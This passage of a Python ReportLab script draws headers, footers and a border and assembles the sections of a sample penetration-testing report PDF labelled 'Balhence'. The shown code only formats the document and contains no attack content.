    canvas.drawCentredString(WIDTH / 2, HEIGHT - 12*mm, "CONFIDENTIAL - SAMPLE REPORT")

    # Footer
    canvas.setFillColor(GRAY)
    canvas.setFont("Helvetica", 7)
    canvas.drawString(20*mm, 10*mm, "Balhence | VAPT Report | Sample")
    canvas.drawRightString(WIDTH - 20*mm, 10*mm, f"Page {doc.page}")

    # Thin accent line at top
    canvas.setStrokeColor(ACCENT)
    canvas.setLineWidth(0.5)
    canvas.line(20*mm, HEIGHT - 14*mm, WIDTH - 20*mm, HEIGHT - 14*mm)

    canvas.restoreState()


def main():
    output = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sample-vapt-report.pdf")

    doc = SimpleDocTemplate(
        output, pagesize=A4,
        leftMargin=20*mm, rightMargin=20*mm,
        topMargin=18*mm, bottomMargin=18*mm,
    )

    styles = build_styles()
    story = []

    cover_page(story, styles)
    toc_page(story, styles)
    exec_summary(story, styles)
    scope_section(story, styles)
    methodology_section(story, styles)
    findings_summary(story, styles)
    detailed_findings_section(story, styles)
    risk_matrix(story, styles)
    retest_and_appendix(story, styles)

    doc.build(story, onFirstPage=lambda c, d: None, onLaterPages=add_page_border)
    print(f"Generated: {output}")


if __name__ == "__main__":
    main()
